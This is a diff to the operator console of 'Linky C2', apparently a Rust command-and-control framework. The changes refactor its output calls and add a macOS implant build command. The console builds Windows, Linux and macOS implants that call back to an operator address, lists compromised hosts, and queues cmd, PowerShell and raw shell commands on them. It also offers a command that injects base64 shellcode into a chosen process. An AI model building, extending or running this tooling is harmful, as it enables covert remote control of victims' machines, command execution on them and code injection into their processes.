@@ -5,9 +5,10 @@ use uuid::Uuid;
 
 use crate::generate;
 use crate::links::{LinkStatus, Links};
+use crate::ui;
 
 pub fn run(links: Arc<Mutex<Links>>) {
-    println!("{}", "Linky C2 – type 'help' for commands\n".bold());
+    ui::print_bold("Linky C2 – type 'help' for commands\n");
 
     let mut rl = DefaultEditor::new().expect("readline init failed");
 
@@ -25,38 +26,39 @@ pub fn run(links: Arc<Mutex<Links>>) {
                     "links" => links_menu(&links, &mut rl),
                     "generate" => {
                         if rest.is_empty() {
-                            println!("Usage: generate <ip:port>");
+                            ui::print("Usage: generate <ip:port>");
                         } else {
                             generate::generate_windows(rest);
                         }
                     }
                     "generate-linux" => {
                         if rest.is_empty() {
-                            println!("Usage: generate-linux <ip:port>");
+                            ui::print("Usage: generate-linux <ip:port>");
                         } else {
                             generate::generate_linux(rest);
                         }
                     }
-                    "generate-native" => {
+
+                    "generate-osx" => {
                         if rest.is_empty() {
-                            println!("Usage: generate-native <ip:port>");
+                            ui::print("Usage: generate-osx <ip:port>");
                         } else {
-                            generate::generate_native(rest);
+                            generate::generate_osx(rest);
                         }
                     }
                     "help" => print_help(),
                     "exit" | "quit" | "kill" => {
-                        println!("Exiting.");
+                        ui::print("Exiting.");
                         std::process::exit(0);
                     }
-                    _ => println!("Unknown command '{}'. Type 'help'.", cmd),
+                    _ => ui::print(&format!("Unknown command '{}'. Type 'help'.", cmd)),
                 }
             }
             Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => {
-                println!("\nExiting.");
+                ui::print("\nExiting.");
                 std::process::exit(0);
             }
-            Err(e) => eprintln!("readline error: {}", e),
+            Err(e) => tracing::error!("readline error: {}", e),
         }
     }
 }
@@ -64,9 +66,9 @@ pub fn run(links: Arc<Mutex<Links>>) {
 // ── Links submenu ────────────────────────────────────────────────────────────
 
 fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
-    println!("\n{}", "╔══════════════════════════════╗".cyan().bold());
-    println!("{}", "║          LINKS MENU          ║".cyan().bold());
-    println!("{}\n", "╚══════════════════════════════╝".cyan().bold());
+    ui::print_cyan_bold("\n╔══════════════════════════════╗");
+    ui::print_cyan_bold("║          LINKS MENU          ║");
+    ui::print_cyan_bold("╚══════════════════════════════╝\n");
     print_links_table(links);
 
     loop {
@@ -81,49 +83,54 @@ fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
 
                 match cmd {
                     "-h" | "help" => {
-                        println!(
+                        ui::print(&format!(
                             "  {}          Show all links (including inactive)",
                             "-a".yellow()
-                        );
-                        println!("  {}   Interact with a link", "-i <name>".yellow());
-                        println!("  {}   Send kill task + mark exited", "-k <name>".yellow());
-                        println!("  {}        Return to main menu", "back".yellow());
+                        ));
+                        ui::print(&format!(
+                            "  {}   Interact with a link",
+                            "-i <name>".yellow()
+                        ));
+                        ui::print(&format!(
+                            "  {}   Send kill task + mark exited",
+                            "-k <name>".yellow()
+                        ));
+                        ui::print(&format!("  {}        Return to main menu", "back".yellow()));
                     }
                     "-a" => print_links_table(links),
                     "-i" => {
                         if rest.is_empty() {
-                            println!("Usage: -i <name>");
+                            ui::print("Usage: -i <name>");
                         } else if let Some(id) = resolve_link(links, rest) {
                             interact(links, id, rl);
                         } else {
-                            println!("{} Link not found: {}", "[-]".red(), rest);
+                            ui::print(&format!("{} Link not found: {}", "[-]".red(), rest));
                         }
                     }
                     "-k" => {
                         if rest.is_empty() {
-                            println!("Usage: -k <name>");
+                            ui::print("Usage: -k <name>");
                         } else if let Some(id) = resolve_link(links, rest) {
                             let mut l = links.lock().unwrap();
                             l.add_task(id, "exit".into(), "kill".into());
                             l.kill_link(id);
-                            println!("{} Kill task queued.", "[+]".green());
+                            ui::print(&format!("{} Kill task queued.", "[+]".green()));
                         } else {
-                            println!("{} Link not found: {}", "[-]".red(), rest);
+                            ui::print(&format!("{} Link not found: {}", "[-]".red(), rest));
                         }
                     }
                     "back" | "exit" | "q" => break,
-                    "generate" | "generate-linux" | "generate-native" | "links" | "kill"
-                    | "quit" => {
-                        println!(
+                    "generate" | "generate-linux" | "links" | "kill" | "quit" => {
+                        ui::print(&format!(
                             "'{}' is a top-level command. Type 'back' to return to the main menu first.",
                             cmd
-                        );
+                        ));
                     }
-                    _ => println!("Unknown command '{}'. Type -h for help.", cmd),
+                    _ => ui::print(&format!("Unknown command '{}'. Type -h for help.", cmd)),
                 }
             }
             Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
-            Err(e) => eprintln!("readline: {}", e),
+            Err(e) => tracing::error!("readline: {}", e),
         }
     }
 }
@@ -132,10 +139,10 @@ fn print_links_table(links: &Arc<Mutex<Links>>) {
     let links = links.lock().unwrap();
     let all = links.all_links();
     if all.is_empty() {
-        println!("{} No links registered.", "[*]".cyan());
+        ui::print(&format!("{} No links registered.", "[*]".cyan()));
         return;
     }
-    println!(
+    ui::print(&format!(
         "\n{}",
         format!(
             "{:<12} {:<24} {:<18} {:<12} {:<10}",
@@ -143,20 +150,19 @@ fn print_links_table(links: &Arc<Mutex<Links>>) {
         )
         .cyan()
         .bold()
-    );
-    println!("{}", "─".repeat(78).cyan());
+    ));
+    ui::print(&format!("{}", "─".repeat(78).cyan()));
     for l in all {
         let status = status_colored(&l.status);
-        println!(
+        ui::print(&format!(
             "{:<12} {:<24} {:<18} {:<12} {}",
             l.name,
             format!("{}@{}", l.username, l.hostname),
             l.internal_ip,
             l.platform,
             status,
-        );
+        ));
     }
-    println!();
 }
 
 // ── Per-link interaction ─────────────────────────────────────────────────────
@@ -165,15 +171,15 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
     {
         let l = links.lock().unwrap();
         if let Some(link) = l.get_link(link_id) {
-            println!(
+            ui::print(&format!(
                 "\n{} Interacting with {} – {}@{} [{}]",
                 "[*]".cyan(),
                 link.name.bold(),
                 link.username,
                 link.hostname,
                 link.platform.yellow()
-            );
-            println!("    Type 'help' for commands, 'back' to return\n");
+            ));
+            ui::print("    Type 'help' for commands, 'back' to return\n");
         }
     }
 
@@ -202,14 +208,14 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                         let mut l = links.lock().unwrap();
                         l.add_task(link_id, "exit".into(), "kill".into());
                         l.kill_link(link_id);
-                        println!("{} Kill task queued.", "[+]".green());
+                        ui::print(&format!("{} Kill task queued.", "[+]".green()));
                         break;
                     }
 
                     // ── Shell execution helpers ──────────────────────────
                     "cmd" => {
                         if !is_windows(links, link_id) {
-                            println!("{} 'cmd' is a Windows-only command.", "[-]".red());
+                            ui::print(&format!("{} 'cmd' is a Windows-only command.", "[-]".red()));
                         } else {
                             queue(links, link_id, format!("cmd /C {}", args), line.clone());
                         }
@@ -217,7 +223,10 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                     "shell" => queue(links, link_id, line.clone(), line.clone()),
                     "powershell" | "ps" => {
                         if !is_windows(links, link_id) {
-                            println!("{} 'powershell' is a Windows-only command.", "[-]".red());
+                            ui::print(&format!(
+                                "{} 'powershell' is a Windows-only command.",
+                                "[-]".red()
+                            ));
                         } else {
                             queue(
                                 links,
@@ -234,7 +243,10 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                     }
                     "integrity" => {
                         if !is_windows(links, link_id) {
-                            println!("{} 'integrity' is a Windows-only command.", "[-]".red());
+                            ui::print(&format!(
+                                "{} 'integrity' is a Windows-only command.",
+                                "[-]".red()
+                            ));
                         } else {
                             queue(links, link_id, line.clone(), line.clone());
                         }
@@ -243,7 +255,10 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                     // ── Process injection ───────────────────────────────
                     "inject" => {
                         if !is_windows(links, link_id) {
-                            println!("{} 'inject' is a Windows-only command.", "[-]".red());
+                            ui::print(&format!(
+                                "{} 'inject' is a Windows-only command.",
+                                "[-]".red()
+                            ));
                         } else {
                             queue(links, link_id, line.clone(), line.clone());
                         }
@@ -254,7 +269,7 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                 }
             }
             Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
-            Err(e) => eprintln!("readline: {}", e),
+            Err(e) => tracing::error!("readline: {}", e),
         }
     }
 }
@@ -262,21 +277,28 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
 fn show_info(links: &Arc<Mutex<Links>>, link_id: Uuid) {
     let l = links.lock().unwrap();
     if let Some(link) = l.get_link(link_id) {
-        println!("  Name      : {}", link.name);
-        println!("  ID        : {}", link.id);
-        println!("  User      : {}@{}", link.username, link.hostname);
-        println!("  Internal  : {}", link.internal_ip);
-        println!("  Platform  : {}", link.platform);
-        println!("  PID       : {}", link.pid);
-        println!(
+        ui::print(&format!("  Name      : {}", link.name));
+        ui::print(&format!("  ID        : {}", link.id));
+        ui::print(&format!(
+            "  User      : {}@{}",
+            link.username, link.hostname
+        ));
+        ui::print(&format!("  Internal  : {}", link.internal_ip));
+        ui::print(&format!("  Platform  : {}", link.platform));
+        ui::print(&format!("  PID       : {}", link.pid));
+        ui::print(&format!(
             "  First seen: {}",
             link.first_checkin.format("%Y-%m-%d %H:%M:%S")
-        );
-        println!(
+        ));
+        ui::print(&format!(
             "  Last seen : {}",
             link.last_checkin.format("%Y-%m-%d %H:%M:%S")
-        );
-        println!("  {}    : {}", "Status".cyan(), status_colored(&link.status));
+        ));
+        ui::print(&format!(
+            "  {}    : {}",
+            "Status".cyan(),
+            status_colored(&link.status)
+        ));
     }
 }
 
@@ -317,26 +339,26 @@ fn split_first(s: &str) -> (&str, &str) {
 }
 
 fn print_help() {
-    println!("  links                    Manage active links");
-    println!("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
-    println!("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
-    println!("  generate-native <ip:port> Build native Linux implant (x86_64-unknown-linux-gnu)");
-    println!("  help                     Show this help");
-    println!("  exit / kill              Quit linky");
+    ui::print("  links                    Manage active links");
+    ui::print("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
+    ui::print("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
+    ui::print("  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)");
+    ui::print("  help                     Show this help");
+    ui::print("  exit / kill              Quit linky");
 }
 
 fn print_link_help() {
-    println!("  cmd <args>          Execute via cmd.exe /C <args>");
-    println!("  shell <cmd>         Send raw command string");
-    println!("  powershell <args>   Execute via powershell.exe");
-    println!("  ls [path]           List directory");
-    println!("  cd <path>           Change directory");
-    println!("  pwd                 Print working directory");
-    println!("  whoami              Current user (domain\\user)");
-    println!("  pid                 Process ID");
-    println!("  integrity           Token integrity level");
-    println!("  inject <pid> <b64>  Inject base64 shellcode into PID");
-    println!("  info                Show link metadata");
-    println!("  kill                Send exit + mark link dead");
-    println!("  back                Return to links menu");
+    ui::print("  cmd <args>          Execute via cmd.exe /C <args>");
+    ui::print("  shell <cmd>         Send raw command string");
+    ui::print("  powershell <args>   Execute via powershell.exe");
+    ui::print("  ls [path]           List directory");
+    ui::print("  cd <path>           Change directory");
+    ui::print("  pwd                 Print working directory");
+    ui::print("  whoami              Current user (domain\\user)");
+    ui::print("  pid                 Process ID");
+    ui::print("  integrity           Token integrity level");
+    ui::print("  inject <pid> <b64>  Inject base64 shellcode into PID");
+    ui::print("  info                Show link metadata");
+    ui::print("  kill                Send exit + mark link dead");
+    ui::print("  back                Return to links menu");
 }
